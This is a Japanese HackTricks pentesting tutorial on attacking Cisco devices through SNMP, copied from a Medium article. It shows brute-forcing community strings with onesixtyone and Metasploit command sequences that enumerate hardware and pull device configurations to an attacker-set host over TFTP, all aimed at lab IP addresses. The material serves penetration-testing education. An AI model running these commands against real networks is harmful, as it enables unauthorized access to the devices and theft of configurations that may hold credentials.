# Cisco SNMP

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ会社で働いていますか？ HackTricksであなたの会社を宣伝したいですか？または、最新バージョンのPEASSにアクセスしたり、HackTricksをPDFでダウンロードしたりしたいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！**
* **[**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう、私たちの独占的な[NFTs](https://opensea.io/collection/the-peass-family)のコレクション**
* **[**official PEASS & HackTricks swag**](https://peass.creator-spring.com)を手に入れましょう**
* **[**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で私を**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **ハッキングのトリックを共有するには、[hacktricks repo](https://github.com/carlospolop/hacktricks)と[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)にPRを提出してください。**

</details>

このページは[https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)からコピーされました。

## SNMPを介した設定の外部流出と列挙 <a href="#e21c" id="e21c"></a>

**SNMP（Simple Network Management Protocol）**は、コンピュータネットワーク上のデバイスの状態を監視するためのプロトコルです。ネットワーク機器、IP電話、法人サーバーなどが対象となります。

**SNMPは、ポート番号161/UDPおよび162/UDPを使用するUDPトランスポート層プロトコルを使用します。**いわゆるコミュニティストリングは、SNMPエージェントをサーバーに参照するために使用されます。これらは、SNMPサーバーとの通信に使用する特別なパスワードと言えます。**コミュニティストリングには、RO（読み取り専用）またはRW（読み書き）の権限があります。**

**実際には、SNMPは装置の状態を監視するだけでなく、設定のダンプや設定の変更などを完全に管理することもできます。**ペンテスターがコミュニティストリングの値を調べることができれば、実際には装置にアクセスできます。**ただし、どの文字列がブルートフォースされたかによって、ROコミュニティストリングかRWコミュニティストリングかが異なります。**

**コミュニティストリングのブルートフォースは、**[**onesixtyone**](https://github.com/trailofbits/onesixtyone) **ユーティリティを使用して実装できます。**ブルートフォースのための辞書とターゲットホストのIPアドレスを入力として受け取ります。ターゲットは次のとおりです。

* **10.10.100.10 — Cisco vIOSスイッチ**
* **10.10.100.254 — Cisco vIOSルーター**
```
~$ onesixtyone -c communitystrings -i targets
```
私たちは、それらのデバイスで使用されているコミュニティストリングを特定しました。これにより、私たちは攻撃を行うことができるようになります。

### 8.1 cisco\_config\_tftp <a href="#1dbf" id="1dbf"></a>

Metasploitフレームワークの**cisco\_config\_tftp**モジュールを使用すると、コミュニティストリングの値を知っていれば、デバイスの設定を取得することができます。RW権限を持つストリングは**private**です。

以下が必要です：

* **RWコミュニティストリング（COMMUNITY）**
* **攻撃者のIPアドレス（LHOST）**
* **ターゲット装置のIPアドレス（RHOSTS）**
* **モジュールがデバイスの設定を出力するパス（OUTPUTDIR）**
```bash
msf6 auxiliary(scanner/snmp/cisco_config_tftp) > set COMMUNITY private
msf6 auxiliary(scanner/snmp/cisco_config_tftp) > set RHOSTS 10.10.100.10
msf6 auxiliary(scanner/snmp/cisco_config_tftp) > set LHOST 10.10.100.50
msf6 auxiliary(scanner/snmp/cisco_config_tftp) > set OUTPUTDIR /home/necreas1ng/snmp
msf6 auxiliary(scanner/snmp/cisco_config_tftp) > exploit
```
モジュールを起動した後、指定したフォルダにアドレス10.10.100.10（10.10.100.10.txt）のホスト構成がダウンロードされます。

![](<../../.gitbook/assets/image (223).png>)

### 8.2 snmp\_enum <a href="#3429" id="3429"></a>

このモジュールを使用すると、ターゲットハードウェアに関する情報を取得できます。すべてがまったく同じです：**COMMUNITY**を指定します（ちなみに、**RO権限を持つ文字列でも構いません**）およびターゲットデバイスのIPアドレスを指定します。
```bash
msf6 auxiliary(scanner/snmp/snmp_enum) > set COMMUNITY public
msf6 auxiliary(scanner/snmp/snmp_enum) > set RHOSTS 10.10.100.10
msf6 auxiliary(scanner/snmp/snmp_enum) > exploit
```
<figure><img src="../../.gitbook/assets/image (218).png" alt=""><figcaption></figcaption></figure>

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ会社**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **ハッキングのトリックを共有するには、[hacktricks repo](https://github.com/carlospolop/hacktricks)と[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。

</details>
